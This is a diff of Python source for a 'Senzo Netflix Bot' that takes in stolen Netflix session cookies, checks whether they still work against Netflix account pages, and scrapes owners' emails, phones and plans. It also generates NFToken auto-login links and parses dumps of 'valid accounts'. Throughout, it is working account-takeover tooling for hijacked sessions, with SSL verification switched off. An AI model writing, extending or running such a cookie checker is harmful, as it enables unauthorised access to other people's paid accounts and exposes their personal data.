@@ -1,5 +1,5 @@
 """
-SENZO NETFLIX BOT - ULTIMATE EDITION v6.0
+SENZO NETFLIX BOT - ULTIMATE EDITION v7.0
 Advanced Cookie Extraction Engine - Production Ready
 Author: @Senzo268
 """
@@ -23,10 +23,9 @@ import random
 import string
 import unicodedata
 import copy
-import queue
 from datetime import datetime, timedelta, timezone
 from typing import Dict, List, Optional, Tuple, Any, Union
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from contextlib import contextmanager
 from functools import wraps
 from urllib.parse import quote, unquote
@@ -58,7 +57,7 @@ except RuntimeError:
 ssl._create_default_https_context = ssl._create_unverified_context
 
 # ============================================================
-# LIBSQL IMPORT - FIXED for all versions
+# LIBSQL IMPORT
 # ============================================================
 HAS_LIBSQL = False
 try:
@@ -191,10 +190,8 @@ def decode_netflix_value(value):
     if value is None:
         return None
     
-    # HTML unescape first
     cleaned = html.unescape(str(value))
     
-    # Common replacements
     replacements = {
         "\\x20": " ",
         "\\u00A0": " ",
@@ -211,7 +208,6 @@ def decode_netflix_value(value):
     for source, target in replacements.items():
         cleaned = cleaned.replace(source, target)
     
-    # Unicode escape handling (multiple passes)
     for _ in range(3):
         previous = cleaned
         cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
@@ -221,18 +217,13 @@ def decode_netflix_value(value):
         if cleaned == previous:
             break
     
-    # URL decode
     try:
         cleaned = unquote(cleaned)
     except Exception:
         pass
     
-    # AGGRESSIVE NetflixId cleaning
-    # Remove ct= prefix
     if cleaned.startswith("ct="):
         cleaned = cleaned[3:]
-    
-    # Strip query parameters
     if "&" in cleaned:
         cleaned = cleaned.split("&")[0]
     if "%26" in cleaned:
@@ -240,24 +231,20 @@ def decode_netflix_value(value):
     if "?" in cleaned:
         cleaned = cleaned.split("?")[0]
     
-    # Remove any remaining URL-encoded characters
     try:
         cleaned = unquote(cleaned)
     except Exception:
         pass
     
-    # Normalize whitespace
     cleaned = re.sub(r"\s+", " ", cleaned).strip()
-    
     return cleaned or None
 
 def parse_localized_date(value):
-    """Parse localized date string to datetime with multiple formats."""
+    """Parse localized date string to datetime."""
     cleaned = decode_netflix_value(value)
     if not cleaned:
         return None
     
-    # ISO formats
     iso_formats = [
         "%Y-%m-%d",
         "%Y-%m-%dT%H:%M:%S",
@@ -275,7 +262,6 @@ def parse_localized_date(value):
         except:
             continue
     
-    # Month name parsing
     month_map = {
         "january": 1, "february": 2, "march": 3, "april": 4,
         "may": 5, "june": 6, "july": 7, "august": 8,
@@ -293,7 +279,7 @@ def parse_localized_date(value):
             if year_match:
                 try:
                     year = int(year_match.group(1))
-                    if 2400 <= year <= 2700:  # Thai calendar
+                    if 2400 <= year <= 2700:
                         year -= 543
                     if 1900 <= year <= 3000:
                         return datetime(year, month_num, 1)
@@ -301,18 +287,14 @@ def parse_localized_date(value):
                     pass
             break
     
-    # Try numeric extraction (MM/DD/YYYY or DD/MM/YYYY)
     numeric_parts = re.findall(r'\b(\d{1,4})\b', cleaned)
     if len(numeric_parts) >= 3:
         try:
             parts = [int(x) for x in numeric_parts[:3]]
-            # Try YYYY-MM-DD
             if 1900 <= parts[0] <= 3000 and 1 <= parts[1] <= 12 and 1 <= parts[2] <= 31:
                 return datetime(parts[0], parts[1], parts[2])
-            # Try MM/DD/YYYY
             if 1 <= parts[0] <= 12 and 1 <= parts[1] <= 31 and 1900 <= parts[2] <= 3000:
                 return datetime(parts[2], parts[0], parts[1])
-            # Try DD/MM/YYYY
             if 1 <= parts[0] <= 31 and 1 <= parts[1] <= 12 and 1900 <= parts[2] <= 3000:
                 return datetime(parts[2], parts[1], parts[0])
         except:
@@ -321,7 +303,7 @@ def parse_localized_date(value):
     return None
 
 def format_display_date(value):
-    """Format date for display with proper localization."""
+    """Format date for display."""
     cleaned = decode_netflix_value(value)
     if not cleaned:
         return "UNKNOWN"
@@ -341,7 +323,7 @@ def format_member_since(value):
     return cleaned
 
 def normalize_phone_number(value, country_code=None):
-    """Normalize phone number with country code."""
+    """Normalize phone number."""
     cleaned = decode_netflix_value(value)
     if not cleaned:
         return None
@@ -448,19 +430,15 @@ def is_extra_member_account(info):
     """Check if account is an extra member account."""
     if not isinstance(info, dict):
         return False
-    
     explicit_flag = info.get("isExtraMemberAccount")
     if explicit_flag in (True, "Yes", "yes", "true", "1"):
         return True
-    
     plan_name = decode_netflix_value(info.get("localizedPlanName") or "")
     if plan_name and "extra member" in plan_name.lower():
         return True
-    
     membership_status = decode_netflix_value(info.get("membershipStatus") or "")
     if membership_status and "extra" in membership_status.lower():
         return True
-    
     return False
 
 def is_active_subscription(info):
@@ -479,14 +457,12 @@ def is_active_subscription(info):
 # ADVANCED COOKIE EXTRACTION ENGINE
 # ============================================================
 
-# Netflix cookie constants
 LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
 OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
 ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
 CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}
 
 def is_netflix_domain(domain):
-    """Check if domain is Netflix."""
     normalized = str(domain or "").strip()
     if normalized.startswith("#HttpOnly_"):
         normalized = normalized[len("#HttpOnly_"):]
@@ -494,7 +470,6 @@ def is_netflix_domain(domain):
     return "netflix." in normalized
 
 def canonicalize_netflix_cookie_name(name):
-    """Canonicalize cookie name with mapping."""
     normalized = str(name or "").strip()
     name_map = {
         "netflixid": "NetflixId",
@@ -510,7 +485,6 @@ def canonicalize_netflix_cookie_name(name):
     return name_map.get(normalized.lower(), CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), name))
 
 def has_required_netflix_cookies(cookie_dict):
-    """Check if required Netflix cookies exist."""
     if not isinstance(cookie_dict, dict):
         return False
     for cookie_name in LOGIN_REQUIRED_NETFLIX_COOKIES:
@@ -519,12 +493,10 @@ def has_required_netflix_cookies(cookie_dict):
     return True
 
 def is_netflix_cookie_entry(domain, name):
-    """Check if cookie entry is Netflix-related."""
     normalized_name = canonicalize_netflix_cookie_name(name)
     return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)
 
 def split_netscape_cookie_columns(line):
-    """Split Netscape cookie line into columns."""
     stripped = line.strip()
     if not stripped:
         return []
@@ -543,7 +515,6 @@ def split_netscape_cookie_columns(line):
     return []
 
 def is_netscape_cookie_line(line):
-    """Check if line is Netscape cookie format."""
     parts = split_netscape_cookie_columns(line)
     if len(parts) < 7:
         return False
@@ -556,7 +527,6 @@ def is_netscape_cookie_line(line):
     return True
 
 def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
-    """Build Netscape cookie entry dict."""
     normalized_expires = str(expires or 0).strip()
     if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
         try:
@@ -575,14 +545,12 @@ def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name,
     }
 
 def format_netscape_cookie_entry(entry):
-    """Format Netscape cookie entry as string."""
     return (
         f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t"
         f"{entry['expires']}\t{entry['name']}\t{entry['value']}"
     )
 
 def cookies_dict_from_netscape(netscape_text):
-    """Convert Netscape text to cookie dict."""
     cookies = {}
     for line in netscape_text.splitlines():
         parts = split_netscape_cookie_columns(line)
@@ -595,7 +563,6 @@ def cookies_dict_from_netscape(netscape_text):
     return cookies
 
 def extract_netscape_cookie_entries(raw_text):
-    """Extract cookies from Netscape format."""
     entries = []
     for index, line in enumerate(raw_text.splitlines()):
         if not is_netscape_cookie_line(line):
@@ -622,7 +589,6 @@ def extract_netscape_cookie_entries(raw_text):
     return entries
 
 def extract_json_cookie_entries(content):
-    """Extract cookies from JSON format."""
     try:
         json_data = json.loads(content)
     except Exception:
@@ -663,7 +629,6 @@ def extract_json_cookie_entries(content):
 
 def extract_raw_cookie_entries(raw_text):
     """Extract cookies from raw text using aggressive regex."""
-    # Build pattern dynamically
     pattern = re.compile(
         rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?"
         r"\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
@@ -678,24 +643,19 @@ def extract_raw_cookie_entries(raw_text):
         else:
             value = value.rstrip(",")
         
-        # AGGRESSIVE CLEANING
         cleaned_value = decode_netflix_value(value)
         if not cleaned_value:
             continue
         
-        # Additional cleaning for NetflixId
         if cookie_name == "NetflixId":
-            # Remove ct= prefix
             if cleaned_value.startswith("ct="):
                 cleaned_value = cleaned_value[3:]
-            # Remove query params
             if "&" in cleaned_value:
                 cleaned_value = cleaned_value.split("&")[0]
             if "%26" in cleaned_value:
                 cleaned_value = cleaned_value.split("%26")[0]
             if "?" in cleaned_value:
                 cleaned_value = cleaned_value.split("?")[0]
-            # Final URL decode
             try:
                 cleaned_value = unquote(cleaned_value)
             except Exception:
@@ -715,8 +675,130 @@ def extract_raw_cookie_entries(raw_text):
         )
     return entries
 
+# ============================================================
+# FORMATTED FILE EXTRACTION (FIX FOR YOUR FILE)
+# ============================================================
+
+def extract_cookie_from_formatted_file(content):
+    """Extract cookies from the formatted file with emojis and headers."""
+    bundles = []
+    
+    # Split by account separator
+    account_pattern = re.compile(
+        r'═══════════════════════════════\s*✅ VALID ACCOUNT #(\d+)\s*═══════════════════════════════(.*?)(?=═══════════════════════════════\s*✅ VALID ACCOUNT #|\Z)',
+        re.DOTALL | re.IGNORECASE
+    )
+    
+    accounts = account_pattern.findall(content)
+    
+    if not accounts:
+        return []
+    
+    for account_num, account_content in accounts:
+        cookies = {}
+        info = {}
+        
+        # Extract email
+        email_match = re.search(r'📧\s*EMAIL:\s*([^\n]+)', account_content, re.IGNORECASE)
+        if email_match:
+            email = email_match.group(1).strip()
+            cookies["email"] = email
+            info["email"] = email
+        
+        # Extract phone
+        phone_match = re.search(r'📞\s*PHONE:\s*([^\n]+)', account_content, re.IGNORECASE)
+        if phone_match:
+            phone = phone_match.group(1).strip()
+            cookies["phone"] = phone
+            info["phone"] = phone
+        
+        # Extract country
+        country_match = re.search(r'🌍\s*COUNTRY:\s*([^\n]+)', account_content, re.IGNORECASE)
+        if country_match:
+            country = country_match.group(1).strip()
+            cookies["country"] = country
+            info["countryOfSignup"] = country
+        
+        # Extract plan
+        plan_match = re.search(r'📦\s*PLAN:\s*([^\n]+)', account_content, re.IGNORECASE)
+        if plan_match:
+            plan = plan_match.group(1).strip()
+            cookies["plan"] = plan
+            info["localizedPlanName"] = plan
+        
+        # Extract status
+        status_match = re.search(r'🛡️\s*STATUS:\s*([^\n]+)', account_content, re.IGNORECASE)
+        if status_match:
+            status = status_match.group(1).strip()
+            cookies["membershipStatus"] = status
+            info["membershipStatus"] = status
+        
+        # Extract cookie - THIS IS THE KEY FIX
+        cookie_match = re.search(r'🍪\s*COOKIE:\s*NetflixId=([^\s]+)', account_content, re.IGNORECASE)
+        if not cookie_match:
+            cookie_match = re.search(r'🍪\s*COOKIE:\s*([^\s]+)', account_content, re.IGNORECASE)
+        
+        if cookie_match:
+            netflix_id = cookie_match.group(1)
+            cleaned = decode_netflix_value(netflix_id)
+            if cleaned:
+                if cleaned.startswith("ct="):
+                    cleaned = cleaned[3:]
+                if "&" in cleaned:
+                    cleaned = cleaned.split("&")[0]
+                if "%26" in cleaned:
+                    cleaned = cleaned.split("%26")[0]
+                if "?" in cleaned:
+                    cleaned = cleaned.split("?")[0]
+                try:
+                    cleaned = unquote(cleaned)
+                except Exception:
+                    pass
+                cookies["NetflixId"] = cleaned
+        
+        # Extract SecureNetflixId if present
+        secure_match = re.search(r'SecureNetflixId=([^\s]+)', account_content, re.IGNORECASE)
+        if secure_match:
+            secure_value = decode_netflix_value(secure_match.group(1))
+            if secure_value:
+                cookies["SecureNetflixId"] = secure_value
+        
+        # Extract NFToken from PC link
+        nftoken_match = re.search(r'🔗\s*PC LINK:\s*https://www\.netflix\.com/browse\?nftoken=([^\s]+)', account_content, re.IGNORECASE)
+        if not nftoken_match:
+            nftoken_match = re.search(r'🔗\s*MOBILE LINK:\s*https://www\.netflix\.com/unsupported\?nftoken=([^\s]+)', account_content, re.IGNORECASE)
+        if not nftoken_match:
+            nftoken_match = re.search(r'🔗\s*TV LINK:\s*https://www\.netflix\.com/tv9\?nftoken=([^\s]+)', account_content, re.IGNORECASE)
+        
+        if nftoken_match:
+            nftoken = nftoken_match.group(1)
+            cookies["nftoken"] = nftoken
+            info["nftoken"] = nftoken
+        
+        # Extract expiry
+        expiry_match = re.search(r'⏰\s*EXPIRES:\s*([^\n]+)', account_content, re.IGNORECASE)
+        if expiry_match:
+            expiry = expiry_match.group(1).strip()
+            cookies["nftoken_expiry"] = expiry
+            info["nftoken_expiry"] = expiry
+        
+        # Only add if we have NetflixId
+        if cookies.get("NetflixId"):
+            netscape_lines = [f".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t{cookies['NetflixId']}"]
+            if cookies.get("SecureNetflixId"):
+                netscape_lines.append(f".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t{cookies['SecureNetflixId']}")
+            
+            bundles.append({
+                "index": account_num,
+                "total": len(accounts),
+                "netscape_text": "\n".join(netscape_lines),
+                "cookies": cookies,
+                "info": info,
+            })
+    
+    return bundles
+
 def build_cookie_bundles_from_entries(entries):
-    """Build cookie bundles from entries."""
     if not entries:
         return []
     
@@ -756,28 +838,32 @@ def build_cookie_bundles_from_entries(entries):
 
 def extract_netflix_cookie_bundles(content):
     """Extract all cookie bundles from content with multiple strategies."""
-    # Strategy 1: JSON
+    
+    # STRATEGY 1: Formatted file with emojis (YOUR FILE FORMAT)
+    bundles = extract_cookie_from_formatted_file(content)
+    if bundles:
+        return bundles
+    
+    # STRATEGY 2: JSON
     bundles = build_cookie_bundles_from_entries(extract_json_cookie_entries(content))
     if bundles:
         return bundles
     
-    # Strategy 2: Netscape
+    # STRATEGY 3: Netscape
     bundles = build_cookie_bundles_from_entries(extract_netscape_cookie_entries(content))
     if bundles:
         return bundles
     
-    # Strategy 3: Raw regex
+    # STRATEGY 4: Raw regex
     bundles = build_cookie_bundles_from_entries(extract_raw_cookie_entries(content))
     if bundles:
         return bundles
     
-    # Strategy 4: ULTIMATE FALLBACK - Extract any long token
-    # Look for base64-like tokens
+    # STRATEGY 5: Ultimate fallback - look for any long token
     long_tokens = re.findall(r'[A-Za-z0-9+/=]{40,}', content)
     for token in long_tokens:
         cleaned_token = decode_netflix_value(token)
         if cleaned_token and len(cleaned_token) > 30:
-            # Check if it looks like a valid NetflixId (starts with ct= or has typical pattern)
             bundles = [{
                 "index": 1,
                 "total": 1,
@@ -786,29 +872,9 @@ def extract_netflix_cookie_bundles(content):
             }]
             return bundles
     
-    # Strategy 5: Look for email + token combination
-    email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', content)
-    if email_match:
-        email = email_match.group(1)
-        # Look for any long string near the email
-        context_start = max(0, email_match.start() - 200)
-        context = content[context_start:email_match.end() + 200]
-        token_match = re.search(r'[A-Za-z0-9+/=]{40,}', context)
-        if token_match:
-            cleaned_token = decode_netflix_value(token_match.group(0))
-            if cleaned_token and len(cleaned_token) > 30:
-                bundles = [{
-                    "index": 1,
-                    "total": 1,
-                    "netscape_text": f".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t{cleaned_token}",
-                    "cookies": {"NetflixId": cleaned_token, "email": email}
-                }]
-                return bundles
-    
     return []
 
 def extract_netflix_cookie_text(content):
-    """Extract first cookie bundle as Netscape text."""
     bundles = extract_netflix_cookie_bundles(content)
     if not bundles:
         return ""
@@ -821,34 +887,35 @@ def extract_netflix_cookie_text(content):
 class NetflixService:
     NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
     
-    # Plan aliases
     PLAN_ALIASES = {
         "premium": {
             "premium", "高級", "高级", "cao_cap", "ozel", "المميزة", 
             "พรีเมียม", "프리미엄", "プレミアム", "premium_plan",
             "premium_extra_member", "extra_member_premium", "caocap",
-            "ultra", "4k", "uhd"
+            "ultra", "4k", "uhd", "Премиум"
         },
         "standard_with_ads": {
             "standard_with_ads", "standardwithads", "estandar_con_anuncios",
             "padrao_com_anuncios", "광고형_스탠다드", "standard with ads",
-            "standar con anuncios", "standard con pubblicità"
+            "standar con anuncios", "standard con pubblicità",
+            "Paket Standar dengan iklan", "Padrão com anúncios",
+            "広告つきスタンダード", "标准广告版"
         },
         "standard": {
             "standard", "estandar", "标准", "標準", "standardowy", 
             "padrao", "standart", "スタンダード", "standardni", "standaard",
-            "hd", "full hd", "1080p"
+            "hd", "full hd", "1080p", "Standard", "Smart"
         },
         "basic": {
             "basic", "basico", "dasar", "基本", "베이직", "ベーシック", 
             "temel", "พื้นฐาน", "podstawowy", "osnovni", "alap",
-            "sd", "480p"
+            "sd", "480p", "Básico", "الأساسية", "Mobile", "Dasar"
         },
         "mobile": {
             "mobile", "ponsel", "seluler", "movil", "มือถือ", "모바일", "モバイル"
         },
         "family": {
-            "family", "familia", "famille", "familie", "familj", "perkataan"
+            "family", "familia", "famille", "familie", "familj"
         },
         "student": {
             "student", "estudiante", "etudiant", "studenten", "studente"
@@ -857,12 +924,10 @@ class NetflixService:
     
     @staticmethod
     def extract_cookie_bundles(content: str) -> List[Dict]:
-        """Extract cookie bundles using the advanced engine."""
         return extract_netflix_cookie_bundles(content)
     
     @staticmethod
     def get_cookie_text(cookies_dict: Dict) -> str:
-        """Convert cookie dict to Netscape format."""
         lines = []
         for name, value in cookies_dict.items():
             if not value:
@@ -873,10 +938,8 @@ class NetflixService:
     
     @staticmethod
     def parse_account_page(response_text: str) -> Dict:
-        """Advanced account parsing with GraphQL + multiple fallbacks."""
         info = {}
         
-        # Try GraphQL parsing
         try:
             data = json.loads(response_text)
             if "data" in data and "growthAccount" in data["data"]:
@@ -914,12 +977,10 @@ class NetflixService:
         except:
             pass
         
-        # Fallback: Regex extraction
         regex_patterns = {
             "email": [
                 r'"emailAddress"\s*:\s*"([^"]+)"',
                 r'"email"\s*:\s*"([^"]+)"',
-                r'"loginId"\s*:\s*"([^"]+)"',
             ],
             "accountOwnerName": [
                 r'"accountOwnerName"\s*:\s*"([^"]+)"',
@@ -953,14 +1014,6 @@ class NetflixService:
                 r'"planPrice"\s*:\s*"([^"]+)"',
                 r'"formattedPrice"\s*:\s*"([^"]+)"',
             ],
-            "paymentMethodType": [
-                r'"paymentMethod"\s*:\s*"([^"]+)"',
-                r'"paymentType"\s*:\s*"([^"]+)"',
-            ],
-            "maskedCard": [
-                r'"displayText"\s*:\s*"([^"]+)"',
-                r'"lastFour"\s*:\s*"([^"]+)"',
-            ],
         }
         
         for key, patterns in regex_patterns.items():
@@ -971,7 +1024,6 @@ class NetflixService:
                         info[key] = decode_netflix_value(match.group(1))
                         break
         
-        # Extra member detection
         extra_patterns = (
             r"assinante\s+extra",
             r"suscriptor\s+extra",
@@ -990,39 +1042,27 @@ class NetflixService:
     
     @staticmethod
     def is_subscribed(info: Dict) -> bool:
-        """Check if account has active subscription."""
         if not info:
             return False
-        
-        # Check membership status
         status = normalize_output_value(info.get("membershipStatus", "")).lower()
         if "current_member" in status:
             return True
-        
-        # Check plan name
         plan = normalize_output_value(info.get("localizedPlanName", "")).lower()
         free_indicators = {"free", "trial", "guest"}
         if plan and not any(indicator in plan for indicator in free_indicators):
             return True
-        
-        # Check billing date
         if info.get("nextBillingDate"):
             return True
-        
-        # Check if extra member (implies paid account)
         if is_extra_member_account(info):
             return True
-        
         return False
     
     @staticmethod
     def is_on_hold(info: Dict) -> bool:
-        """Check if account is on hold."""
         return is_on_hold_account(info)
     
     @staticmethod
     def derive_plan(info: Dict, is_subscribed: bool) -> Tuple[str, str]:
-        """Derive plan from info."""
         if not is_subscribed:
             return "free", "Free"
         
@@ -1030,16 +1070,13 @@ class NetflixService:
         streams = safe_int(info.get("maxStreams"))
         quality = normalize_output_value(info.get("videoQuality", "")).lower()
         
-        # Check if extra member
         if is_extra_member_account(info):
             return "extra_member_premium", "Premium (Extra Member)"
         
-        # Check plan aliases
         for key, aliases in NetflixService.PLAN_ALIASES.items():
             if any(alias in plan_name for alias in aliases):
                 return key, get_canonical_output_label(key)
         
-        # Derive from streams/quality
         if streams >= 4 or "uhd" in quality or "4k" in quality:
             return "premium", "Premium"
         elif streams >= 2 or "hd" in quality:
@@ -1053,7 +1090,6 @@ class NetflixService:
     
     @staticmethod
     def generate_nftoken(netflix_id: str, attempts: int = 3) -> Tuple[Optional[str], Optional[str]]:
-        """Generate NFToken from NetflixId with retry logic."""
         if not netflix_id or len(netflix_id) < 20:
             return None, None
         
@@ -1146,26 +1182,22 @@ class NetflixService:
     
     @staticmethod
     def check_account(cookies_dict: Dict) -> Dict:
-        """Enhanced account checker with aggressive cleaning and retry logic."""
+        """Enhanced account checker with aggressive cleaning."""
         if not cookies_dict:
             return {"valid": False, "error": "No cookies"}
         
-        # Extract and clean NetflixId
         netflix_id = decode_netflix_value(cookies_dict.get("NetflixId", ""))
         
-        # If no NetflixId, try to find any long string in the dict
         if not netflix_id or len(netflix_id) < 30:
             for key, value in cookies_dict.items():
                 if isinstance(value, str) and len(value) > 50:
                     cleaned_value = decode_netflix_value(value)
                     if cleaned_value and len(cleaned_value) > 30:
-                        # Check if it looks like a valid token
                         if re.match(r'^[A-Za-z0-9+/=]+$', cleaned_value[:50]) or cleaned_value.startswith("ct="):
                             netflix_id = cleaned_value
                             logger.info(f"Using fallback token from {key}")
                             break
         
-        # Final aggressive cleaning
         if netflix_id:
             if netflix_id.startswith("ct="):
                 netflix_id = netflix_id[3:]
@@ -1181,7 +1213,7 @@ class NetflixService:
                 pass
         
         if not netflix_id or len(netflix_id) < 30:
-            return {"valid": False, "error": "No usable token found (minimum length 30 chars)"}
+            return {"valid": False, "error": "No usable token found"}
         
         session = None
         try:
@@ -1196,7 +1228,6 @@ class NetflixService:
                 "Cache-Control": "max-age=0",
             })
             
-            # Set all cookies
             for name, value in cookies_dict.items():
                 cleaned_value = decode_netflix_value(value)
                 if not cleaned_value:
@@ -1230,14 +1261,11 @@ class NetflixService:
                             allow_redirects=True
                         )
                         
-                        # Check if redirected to login
                         if "login" in response.url.lower() or "signin" in response.url.lower():
                             return {"valid": False, "error": "Redirected to login - cookie expired or invalid"}
                         
                         if response.status_code == 200:
                             text = response.text
-                            
-                            # Check if it's a real account page
                             account_indicators = ["account", "membership", "profile", "browse", "Your Account", "netflix"]
                             if any(indicator in text.lower() for indicator in account_indicators):
                                 info = NetflixService.parse_account_page(text)
@@ -1297,7 +1325,6 @@ class NetflixService:
 # ============================================================
 
 class TursoCursorWrapper:
-    """Wrapper to standardize Turso query results across different drivers."""
     def __init__(self, result_set):
         if hasattr(result_set, 'columns'):
             self._columns = getattr(result_set, 'columns', ())
@@ -1369,17 +1396,15 @@ class DatabaseManager:
         self.turso_driver_type = None
         self._turso_lock = threading.Lock()
         self._sqlite_lock = threading.Lock()
-        
         self._connect_turso()
         self._connect_sqlite()
     
     def _connect_turso(self):
-        """Connect to Turso with multi-scheme fallback."""
         raw_url = TURSO_DATABASE_URL.strip() if TURSO_DATABASE_URL else ""
         token = TURSO_AUTH_TOKEN.strip() if TURSO_AUTH_TOKEN else ""
         
         if not raw_url:
-            logger.info("ℹ️ TURSO_DATABASE_URL not configured — using local SQLite for meta database.")
+            logger.info("ℹ️ TURSO_DATABASE_URL not configured — using local SQLite.")
             self.use_turso = False
             return
 
@@ -1389,10 +1414,7 @@ class DatabaseManager:
                 clean_host = clean_host[len(prefix):]
                 break
 
-        candidate_urls = [
-            f"https://{clean_host}",
-            f"libsql://{clean_host}"
-        ]
+        candidate_urls = [f"https://{clean_host}", f"libsql://{clean_host}"]
 
         try:
             import libsql_client
@@ -1407,10 +1429,10 @@ class DatabaseManager:
                     logger.info(f"✅ Turso connected via libsql_client ({target_url})")
                     self._init_turso_tables()
                     return
-                except Exception as e_url:
-                    logger.warning(f"⚠️ Turso connection to {target_url} failed: {e_url}")
-        except Exception as e1:
-            logger.warning(f"⚠️ libsql_client library error: {e1}")
+                except Exception:
+                    pass
+        except Exception:
+            pass
 
         try:
             import libsql
@@ -1429,12 +1451,12 @@ class DatabaseManager:
                     logger.info(f"✅ Turso connected via libsql.connect ({target_url})")
                     self._init_turso_tables()
                     return
-                except Exception as e_libsql:
-                    logger.warning(f"⚠️ libsql connection to {target_url} failed: {e_libsql}")
-        except Exception as e2:
-            logger.warning(f"⚠️ libsql library error: {e2}")
+                except Exception:
+                    pass
+        except Exception:
+            pass
 
-        logger.error("❌ Could not connect to Turso — falling back to local SQLite meta tables.")
+        logger.error("❌ Could not connect to Turso — falling back to local SQLite.")
         self.use_turso = False
     
     @retry_on_failure(max_retries=3, delay=1.0)
@@ -1446,7 +1468,7 @@ class DatabaseManager:
             self.sqlite_conn.execute('PRAGMA synchronous=NORMAL')
             self.sqlite_conn.execute('PRAGMA cache_size=10000')
             self.sqlite_conn.execute('PRAGMA temp_store=MEMORY')
-            logger.info("✅ SQLite connected (Accounts & Meta fallback)")
+            logger.info("✅ SQLite connected")
             self._init_sqlite_tables()
         except Exception as e:
             logger.error(f"❌ SQLite error: {e}")
@@ -1547,8 +1569,8 @@ class DatabaseManager:
                     else:
                         cur = self.turso_conn.cursor()
                         cur.execute(stmt)
-                except Exception as e:
-                    logger.error(f"Error creating Turso table: {e}")
+                except Exception:
+                    pass
             if self.turso_driver_type == 'cursor':
                 try:
                     self.turso_conn.commit()
@@ -1712,7 +1734,7 @@ class DatabaseManager:
                 )
             ''')
             self.sqlite_conn.commit()
-            logger.info("✅ SQLite meta tables initialized (local mode)")
+            logger.info("✅ SQLite meta tables initialized")
     
     @retry_on_failure(max_retries=3, delay=1.0)
     def execute_turso(self, query: str, params: Optional[tuple] = None) -> Any:
@@ -1780,7 +1802,6 @@ db = DatabaseManager()
 @flask_app.route("/")
 @flask_app.route("/health")
 def health_check():
-    """Health check endpoint - bulletproof for Railway deployment"""
     try:
         db_status = "Unknown"
         try:
@@ -1796,7 +1817,7 @@ def health_check():
         return jsonify({
             "status": "online",
             "service": "Senzo Netflix Bot",
-            "version": "6.0.0",
+            "version": "7.0.0",
             "bot_token_configured": bot_configured,
             "accounts_db": DATABASE_PATH,
             "database": db_status,
@@ -1807,7 +1828,7 @@ def health_check():
         return jsonify({
             "status": "online",
             "service": "Senzo Netflix Bot",
-            "version": "6.0.0",
+            "version": "7.0.0",
             "error": str(e)[:50],
             "timestamp": datetime.utcnow().isoformat()
         }), 200
@@ -1908,8 +1929,8 @@ class UserRepository:
                     pending_report=safe_bool(row[12]), pending_report_account_id=safe_int(row[13]),
                     pending_report_type=safe_str(row[14]), warnings=safe_int(row[15])
                 )
-        except Exception as e:
-            logger.error(f"UserRepository.get error: {e}")
+        except Exception:
+            pass
         return User(user_id=user_id)
     
     def create_or_update(self, user_id: int, username: str = "", first_name: str = "") -> bool:
@@ -1922,8 +1943,7 @@ class UserRepository:
             ''', (user_id, safe_str(username), safe_str(first_name), is_admin_flag))
             self.db.commit_meta()
             return True
-        except Exception as e:
-            logger.error(f"UserRepository.create_or_update error: {e}")
+        except Exception:
             return False
     
     def get_all(self) -> List[User]:
@@ -1940,16 +1960,14 @@ class UserRepository:
                 )
                 for r in rows
             ]
-        except Exception as e:
-            logger.error(f"UserRepository.get_all error: {e}")
+        except Exception:
             return []
     
     def get_banned(self) -> List[Tuple]:
         try:
             cur = self.db.execute_meta('SELECT user_id, username, first_name FROM users WHERE is_banned = 1')
             return cur.fetchall()
-        except Exception as e:
-            logger.error(f"UserRepository.get_banned error: {e}")
+        except Exception:
             return []
     
     def ban(self, user_id: int, admin_id: int, reason: str) -> bool:
@@ -1958,8 +1976,7 @@ class UserRepository:
             self.db.execute_meta('INSERT INTO ban_logs (user_id, admin_id, reason) VALUES (?, ?, ?)', (user_id, admin_id, reason))
             self.db.commit_meta()
             return True
-        except Exception as e:
-            logger.error(f"UserRepository.ban error: {e}")
+        except Exception:
             return False
     
     def unban(self, user_id: int) -> bool:
@@ -1967,8 +1984,7 @@ class UserRepository:
             self.db.execute_meta('UPDATE users SET is_banned = 0, warnings = 0 WHERE user_id = ?', (user_id,))
             self.db.commit_meta()
             return True
-        except Exception as e:
-            logger.error(f"UserRepository.unban error: {e}")
+        except Exception:
             return False
     
     def add_warning(self, user_id: int, admin_id: int, reason: str) -> int:
@@ -1985,8 +2001,7 @@ class UserRepository:
             if warnings >= 3:
                 self.ban(user_id, admin_id, "3 warnings - Auto ban")
             return warnings
-        except Exception as e:
-            logger.error(f"UserRepository.add_warning error: {e}")
+        except Exception:
             return 0
     
     def update_cooldown(self, user_id: int) -> bool:
@@ -1998,8 +2013,7 @@ class UserRepository:
             ''', (user_id,))
             self.db.commit_meta()
             return True
-        except Exception as e:
-            logger.error(f"UserRepository.update_cooldown error: {e}")
+        except Exception:
             return False
     
     def find_by_query(self, query: str) -> Optional[User]:
@@ -2011,8 +2025,8 @@ class UserRepository:
             row = cur.fetchone()
             if row:
                 return self.get(row[0])
-        except Exception as e:
-            logger.error(f"UserRepository.find_by_query error: {e}")
+        except Exception:
+            pass
         return None
 
 class AccountRepository:
@@ -2039,8 +2053,8 @@ class AccountRepository:
                     user_guid=safe_str(row[15]), phone=safe_str(row[16]), extra_member=safe_bool(row[17]),
                     membership_status=safe_str(row[18]), on_hold=safe_bool(row[19])
                 )
-        except Exception as e:
